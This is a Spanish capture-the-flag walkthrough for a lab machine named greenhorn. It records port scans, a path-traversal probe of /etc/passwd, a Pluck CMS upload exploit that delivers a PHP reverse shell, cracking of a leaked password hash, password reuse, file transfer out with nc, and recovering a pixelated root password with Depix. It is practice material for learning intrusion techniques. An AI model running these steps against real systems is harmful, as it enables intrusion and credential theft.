@@ -1,0 +1,215 @@
+Máquina easy greenhorn
+
+Discovery inicial
+
+-----------------------
+
+sudo nmap -p- -sS -vvv -n -Pn --min-rate 5000 10.129.X.X -oG scan
+Scanning 10.129.x.x [65535 ports]
+Discovered open port 80/tcp on 10.129.x.x
+Discovered open port 22/tcp on 10.129.x.x
+Discovered open port 3000/tcp on 10.129.x.x
+Completed SYN Stealth Scan at 15:04, 12.93s elapsed (65535 total ports)
+Nmap scan report for 10.129.x.x
+Host is up, received user-set (0.11s latency).
+Scanned at 2024-07-22 15:03:48 CEST for 13s
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE REASON
+22/tcp   open  ssh     syn-ack ttl 63
+80/tcp   open  http    syn-ack ttl 63
+3000/tcp open  ppp     syn-ack ttl 63
+
+sudo nmap -p22,80,3000 -sCV 10.129.x.x -oN targeted
+  5   │ PORT     STATE SERVICE VERSION
+   6   │ 22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+   7   │ | ssh-hostkey: 
+   8   │ |   256 57:d6:92:8a:72:44:84:17:29:eb:5c:c9:63:6a:fe:fd (ECDSA)
+   9   │ |_  256 40:ea:17:b1:b6:c5:3f:42:56:67:4a:3c:ee:75:23:2f (ED25519)
+  10   │ 80/tcp   open  http    nginx 1.18.0 (Ubuntu)
+  11   │ |_http-server-header: nginx/1.18.0 (Ubuntu)
+  12   │ |_http-title: Did not follow redirect to http://greenhorn.htb/
+  13   │ 3000/tcp open  ppp?
+  14   │ | fingerprint-strings: 
+  15   │ |   GenericLines, Help, RTSPRequest: 
+  16   │ |     HTTP/1.1 400 Bad Request
+  17   │ |     Content-Type: text/plain; charset=utf-8
+  18   │ |     Connection: close
+  19   │ |     Request
+  20   │ |   GetRequest: 
+  21   │ |     HTTP/1.0 200 OK
+  22   │ |     Cache-Control: max-age=0, private, must-revalidate, no-transform
+  23   │ |     Content-Type: text/html; charset=utf-8
+  24   │ |     Set-Cookie: i_like_gitea=512b352c02b48bb3; Path=/; HttpOnly; SameSite=Lax
+  25   │ |     Set-Cookie: _csrf=yg181oBZSmTjsfpkgZ2rrPSilFs6MTcyMTY0NjMzMzUwNTUwNDEyMg; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
+  26   │ |     X-Frame-Options: SAMEORIGIN
+  27   │ |     Date: Mon, 22 Jul 2024 11:05:33 GMT
+  28   │ |     <!DOCTYPE html>
+  29   │ |     <html lang="en-US" class="theme-auto">
+  30   │ |     <head>
+  31   │ |     <meta name="viewport" content="width=device-width, initial-scale=1">
+  32   │ |     <title>GreenHorn</title>
+  33   │ |     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6Ly9ncmVlbmh
+       │ vcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjUxMng1MTIifSx7
+       │ InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYX
+  34   │ |   HTTPOptions: 
+  35   │ |     HTTP/1.0 405 Method Not Allowed
+  36   │ |     Allow: HEAD
+  37   │ |     Allow: GET
+  38   │ |     Cache-Control: max-age=0, private, must-revalidate, no-transform
+  39   │ |     Set-Cookie: i_like_gitea=464ad5b8ec7291c2; Path=/; HttpOnly; SameSite=Lax
+  40   │ |     Set-Cookie: _csrf=Z7DvyhwEI99Ds8TMPrfYov-SvqQ6MTcyMTY0NjMzOTQyMzMyODY0Mw; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
+  41   │ |     X-Frame-Options: SAMEORIGIN
+  42   │ |     Date: Mon, 22 Jul 2024 11:05:39 GMT
+  43   │ |_    Content-Length: 0
+  44   │ 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cg
+       │ i?new-service :
+  45   │ SF-Port3000-TCP:V=7.94SVN%I=7%D=7/22%Time=669E591D%P=x86_64-pc-linux-gnu%r
+  46   │ SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
+  47   │ SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
+  48   │ SF:d\x20Request")%r(GetRequest,1000,"HTTP/1\.0\x20200\x20OK\r\nCache-Contr
+  49   │ SF:ol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nCo
+  50   │ SF:ntent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_git
+  51   │ SF:ea=512b352c02b48bb3;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Coo
+  52   │ SF:kie:\x20_csrf=yg181oBZSmTjsfpkgZ2rrPSilFs6MTcyMTY0NjMzMzUwNTUwNDEyMg;\x
+  53   │ SF:20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Opt
+  54   │ SF:ions:\x20SAMEORIGIN\r\nDate:\x20Mon,\x2022\x20Jul\x202024\x2011:05:33\x
+  55   │ SF:20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"the
+  56   │ SF:me-auto\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"width=dev
+  57   │ SF:ice-width,\x20initial-scale=1\">\n\t<title>GreenHorn</title>\n\t<link\x
+  58   │ SF:20rel=\"manifest\"\x20href=\"data:application/json;base64,eyJuYW1lIjoiR
+  59   │ SF:3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6
+  60   │ SF:Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmh
+  61   │ SF:vcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLC
+  62   │ SF:JzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvY
+  63   │ SF:X")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
+  64   │ SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
+  65   │ SF:20Request")%r(HTTPOptions,197,"HTTP/1\.0\x20405\x20Method\x20Not\x20All
+  66   │ SF:owed\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Control:\x20max-age=0,
+  67   │ SF:\x20private,\x20must-revalidate,\x20no-transform\r\nSet-Cookie:\x20i_li
+  68   │ SF:ke_gitea=464ad5b8ec7291c2;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nS
+  69   │ SF:et-Cookie:\x20_csrf=Z7DvyhwEI99Ds8TMPrfYov-SvqQ6MTcyMTY0NjMzOTQyMzMyODY
+  70   │ SF:0Mw;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Fra
+  71   │ SF:me-Options:\x20SAMEORIGIN\r\nDate:\x20Mon,\x2022\x20Jul\x202024\x2011:0
+  72   │ SF:5:39\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\
+  73   │ SF:.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=
+  74   │ SF:utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
+  75   │ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+  76   │ 
+  77   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+  78   │ # Nmap done at Mon Jul 22 15:07:04 2024 -- 1 IP address (1 host up) scanned in 111.43 seconds
+
+  -----------------
+
+  Aparentemente máquina ubuntu, con ssh y servidor web, además en el puerto 3000 parace que hay un SVN
+
+  Añadimos al /etc/host greenhorn.htb
+
+  Al entrar en la web vemos que es un CMS y hay usuario admin
+    
+    admin | powered by pluck 
+
+Con searchsploit vemos que es vulnerable la version, el RCE es el más importante
+    Pluck v4.7.18 - Remote Code Execution (RCE)                | php/webapps/51592.py
+    pluck v4.7.18 - Stored Cross-Site Scripting (XSS)          | php/webapps/51420.txt
+
+La url de la ruta además lleva un file
+    greenhorn.htb/?file=welcome-to-greenhorn
+    http://greenhorn.htb/?file=../../../../../../etc/passwd
+
+Si cambiamos el archivo se mantiene el mensaje
+    A hacking attempt has been detected. For security reasons, we're blocking any code execution.
+
+Si clickeo en admin voy al login
+    http://greenhorn.htb/login.php
+
+El puerto 3000 tiene un gitea
+
+    Powered by Gitea
+    Version: 1.21.11 Page:
+
+Antes de seguir voy a poner a ver si descubro algún subdirectorio en las 2 url
+
+sudo gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.129.x.x/ -t 200 --exclude-length=154
+No nos da nada
+sudo gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.129.x.x:3000/ -t 200 -b="404,500" --exclude-length=154
+Starting gobuster in directory enumeration mode
+===============================================================
+/admin                (Status: 303) [Size: 38] [--> /user/login]
+/issues               (Status: 303) [Size: 38] [--> /user/login]
+/v2                   (Status: 401) [Size: 50]
+/explore              (Status: 303) [Size: 41] [--> /explore/repos]
+/milestones           (Status: 303) [Size: 38] [--> /user/login]
+/notifications        (Status: 303) [Size: 38] [--> /user/login]
+Progress: 220559 / 220560 (100.00%)
+
+Tampoco sacamos mucho
+La ruta explore/repos nos lleva a un repositorio visible
+http://greenhorn.htb:3000/GreenAdmin/GreenHorn
+Donde hay un commit de un Junior, que es posible usuario
+Reviso un poco el código
+
+http://greenhorn.htb:3000/GreenAdmin/GreenHorn/src/branch/main/data/settings/pass.php
+<?php
+$ww = 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163';
+?>
+
+Dejo un poco para más adelante las pruebas y sigo con buscar subdominios
+
+wfuzz -c -z file,/usr/share/SecLists/Discovery/DNS/n0kovo_subdomains_medium.txt -t 200 --hh=154 -H "HOST: FUZZ.greenhorn.htb" http://greenhorn.htb
+
+hacemos lo mismo con el gitea pero no sacamos nada.
+
+Nos quedaría ver el ssh, pero creo que vamos a continuar por el exploit rce que es el paso de entrada más obvio.
+
+--------------------------------------------------------------------------
+
+Exploit, parece que el vector de entrada más obvio es el exploit rce del cms en esa misma versión
+
+El exploit parece que sube un zip que no se autentica y luego lo descomprime en la ruta:
+http://localhost/pluck/data/modules/mirabbas/exploit.php
+
+Generamos el zip con la revshell.php
+zip file.zip revshell.php
+
+ejecutamos el exploit y ponemos el file.zip como archivo
+
+no me funciona reviso un poco que puede pasar e intento ver si llego a la ruta manualmente
+http://10.129.x.x/admin.php?action=installmodule
+
+voy a probar a crackear el password de arriba y ver si puedo logear como admin para luego ejecutar el rce
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst
+iloveyou1        (?)     
+
+Pruebo con iloveyou1 a logearme y funciona
+añado el password al script, reviso las rutas, y pruebo de nuevo
+
+Perfecto, ahora luego de logear también en el cms conseguimos acceder a la revshell, aunque el exploit no lo lanzó
+http://greenhorn.htb/data/modules/mirabbas/shell.php
+
+una vez adentro su junior y probamos el password y ya tenemos la flag de usuario
+
+--------------------------------------------------
+
+hay un archivo que es como configurar openVAS me lo descargo con nc 
+
+nc -lp 12345 > vas.pdf 
+
+nc 10.10.x.x 12345 < openvas.pdf
+
+El pdf nos tiene una contraseña pixelada
+
+Buscando encuentro que hay herramientas que nos ayudan con esto
+
+https://github.com/spipm/Depix.git
+
+Al final de darle vueltas ejecuto el comando
+
+python3 depix.py -p code.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png
+
+Tras muchísimo batallar con depix conseguí que fuese:
+
+pdfimages -j vas.pdf output
+python3 depix.py -p output.ppm -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png
+
+probamos con la contraseña con root y voilá
